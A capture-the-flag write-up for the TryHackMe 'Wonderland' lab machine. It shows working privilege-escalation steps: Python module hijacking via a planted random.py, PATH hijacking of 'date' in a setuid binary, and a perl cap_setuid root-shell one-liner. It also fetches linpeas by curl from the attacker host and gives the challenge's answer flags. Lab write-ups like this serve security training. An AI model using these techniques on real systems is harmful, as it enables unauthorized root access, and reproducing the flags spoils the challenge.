---
layout: post
title: THM CTF Wonderland
tags: [THM, CTF, Wonderland]
date: 2023-09-27 23:28:26
toc:
    sidebar: left
    toc-depth: 3
---

# THM CTF Wonderland

In today's mission, we'll have to compromise a machine in order to retrieve flags.

To begin with, we scan the machine if there's an specific opened port with nmap

``` sh
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sS -T4 10.10.184.203
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-27 18:03 EDT
Nmap scan report for 10.10.108.249
Host is up (0.050s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
```

When we connect to the web page, we see a riddle on Alice in Wonderland theme.

![Follow the white rabbit](/assets/img/images/thm_ctf_wonderland_writeup/rJY43lUxp.png)

Using ffuf/dirbuster, we can find if there's any hidden path we can obtain. When the tool has finished, we see 2 available paths.

``` sh
┌──(kali㉿kali)-[/usr/share/seclists/Fuzzing]
└─$ ffuf -w 1-4_all_letters_a-z.txt -u http://10.10.184.203/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.184.203/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/1-4_all_letters_a-z.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 32ms]
    * FUZZ: r

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 32ms]
    * FUZZ: img

```

Following the URL http://10.10.184.203/r, we obtain a second riddle. It says "Keep Going", so I continue my fuzzing using the last question.

![Keep Going](/assets/img/images/thm_ctf_wonderland_writeup/SyrHmW8ep.png)

``` sh
┌──(kali㉿kali)-[/usr/share/seclists/Fuzzing]
└─$ ffuf -w 1-4_all_letters_a-z.txt -u http://10.10.184.203/r/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.184.203/r/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/1-4_all_letters_a-z.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 29ms]
    * FUZZ: a

```

We go through http://10.10.184.203/r/a, and we obtain the same page with "Keep Going".

After keeping doing that, we get http://10.10.184.203/r/a/b/b/i/t, which is ironic because we have the clue since the begining.

![Open the door and enter wonderland](/assets/img/images/thm_ctf_wonderland_writeup/SJzd8-Iep.png)

By checking the source code, we can see a set of credentials, that might get us to a successful ssh connection to the server.

![Source code](/assets/img/images/thm_ctf_wonderland_writeup/SkX6PWIxa.png)

`alice:HowDothTheLittleCrocodileImproveHisShiningTail`

By connecting with the provided credentials with ssh, we subsequently list if there's any interesting files.

``` bash
alice@wonderland:~$ ls
root.txt  walrus_and_the_carpenter.py
```

Wz can't cat the root.txt and when I launch the walrus_and_the_carpenter.py, it prints random strings of a poem on the terminal.

``` sh
alice@wonderland:~$ cat root.txt 
cat: root.txt: Permission denied
alice@wonderland:~$ python3 walrus_and_the_carpenter.py
The line was:    And this was odd, because, you know,
The line was:    
The line was:    "If this were only cleared away,"
The line was:    "The butter’s spread too thick!"
The line was:    For some of us are out of breath,
The line was:    And that was scarcely odd, because
The line was:    And more, and more, and more —
The line was:    Swept it for half a year,
The line was:    They wept like anything to see
The line was:    But never a word he said:
alice@wonderland:~$ cat walrus_and_the_carpenter.py 
import random
poem = """The sun was shining on the sea,
Shining with all his might:
...
for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

We try to see if I have any sudo permissions. Apparently, the scripts runs using sudo privileges.

``` sh
alice@wonderland:~$ sudo -l
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

So we need to change the python random.py script to run bash, using the user rabbit.
To see where are the python packages, we run the following command:

``` sh
alice@wonderland:~$ python3 -c 'import sys; print(sys.path)'
['', '/usr/lib/python36.zip', '/usr/lib/python3.6', '/usr/lib/python3.6/lib-dynload', '/usr/local/lib/python3.6/dist-packages', '/usr/lib/python3/dist-packages']
```

Thus, we create a random.py containing what we need to escalate.
Python will take first the current directory, then the */usr/lib/python36.zip*, etc...

``` sh
alice@wonderland:~$ cat random.py 
import os

os.system('/bin/bash')
```

After being able to usurpate the rabbit account, we go the the home foler and we find a setUID elf binary called `teaParty`.

``` sh
rabbit@wonderland:/home/rabbit$ ls -l
total 20
-rwsr-sr-x 1 root root 16816 May 25  2020 teaParty

rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Sat, 30 Sep 2023 22:19:16 +0000
Ask very nicely, and I will give you some tea while you wait for him

Segmentation fault (core dumped)
```

We get a "Segmentation fault (core dumped)" returned string, so we may have to put a special keyword.
I'll analyze the binary by using `strings` on my own machine since it's not available in wonderland.
We also can use Ghidra to get more details. 

``` sh
┌──(kali㉿kali)-[~/Documents/THM/CTF/Wonderland]
└─$ strings teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
```

We see that it always return *Segmentation fault (core dumped)* whatever we provide to it.
We also see it uses date so we can make our own *date* to elevate our privileges.

![date](/assets/img/images/thm_ctf_wonderland_writeup/BJc8Hf8ga.png)

We export our new PATH to make our date script being used first instead of the real date.

``` sh
rabbit@wonderland:/home/rabbit$ chmod 777 ./date
rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH
rabbit@wonderland:/home/rabbit$ teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ 
hatter@wonderland:/home/rabbit$ cd /home/hatter
hatter@wonderland:/home/hatter$ cat password.txt 
WhyIsARavenLikeAWritingDesk?

```

We use linpeas to search if there's any vulnerabilities on the system.
We can send it using `python -m http.server 8080` on our attacker machine.

``` sh

hatter@wonderland:/home/hatter$ curl 10.11.24.118:8080/linpeas.sh > linpeas.sh 
hatter@wonderland:/home/hatter$ chmod 700 ./linpeas.sh
```

Before executing it, we'll use an ssh connection to avoid any problems in the future.

``` sh
┌──(kali㉿kali)-[~]
└─$ ssh hatter@10.10.184.203                        
hatter@10.10.184.203's password:
hatter@wonderland:~$ ./linpeas.sh
Files with capabilities (limited to 50):
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

In the capabilities part, we are able to use perl as the setUID capability is present, put by root user.
On GTFObins, we see the following advice:

```  sh
Capabilities

If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.

    cp $(which perl) .
    sudo setcap cap_setuid+ep perl

    ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

With this given, we just use the command with *hatter*.

``` sh
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# 
# whoami
root
# find / -name 'user.txt'
/root/user.txt
# cat /root/user.txt
thm{"Curiouser and curiouser!"}
# cat /home/alice/root.txt
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```

We succesfully retrieved the flag in `/root/user.txt` and in `/home/alice/root.txt`

**Obtain the flag in user.txt**

*Answer: `thm{"Curiouser and curiouser!"}`*

**Escalate your privileges, what is the flag in root.txt?**

*Answer: `thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}`*